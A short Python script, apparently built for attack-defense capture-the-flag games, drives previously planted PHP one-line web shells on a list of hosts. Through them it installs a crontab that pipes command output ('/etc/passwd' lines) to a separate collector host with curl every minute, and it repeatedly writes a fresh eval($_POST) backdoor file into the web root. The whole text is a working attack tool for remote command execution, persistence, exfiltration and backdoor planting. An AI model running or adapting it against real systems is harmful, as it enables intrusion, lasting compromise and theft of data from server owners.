# - coding:utf8
import requests
import re
password = "ma"                               #一句话web马密码
one_word = "http://192.168.59.106:88/ma.php"  #一句话web马地址
one_word_list = [                             #一句话web马地址(批量)
    # "http://192.168.59.106:88/ma.php",
    # "http://192.168.59.107:88/ma1.php",
    # "http://192.168.59.108:88/ma2.php"
]

flag_handler = "http://192.168.59.3:3001/flag"   # flagHandler.py的访问地址
flag_payload = "cat /etc/passwd |grep root"      # 拿flag需要的命令
protect_file = " /opt/html/xiaoma3.php "  # 要写马的地址
protect_payload = "echo \\\\\\\"<?php \\\\\\\\\\\\n @eval(\\\\\\\\\\\\\\$_POST[\\\"" + password + "\\\"]); \\\\\\\\\\\\n \\\\\\\" > " + protect_file

cron_payload = "* * * * * " + flag_payload + " | curl  " + flag_handler + " --data-binary @- "
cron_payload += "\\n* * * * * " + protect_payload + " "
shell_payload = "echo \\\"" + cron_payload + "\\\" | crontab && echo ok"

print shell_payload
if len(one_word_list) == 0:
    r = requests.post(one_word, data={
        password: "system(\" " + shell_payload + " \");"
    })
    print r.text
else:
    for url in one_word_list:
        r = requests.post(url, data={
            password: "system(\" " + shell_payload + " \");"
        })
        print r.text

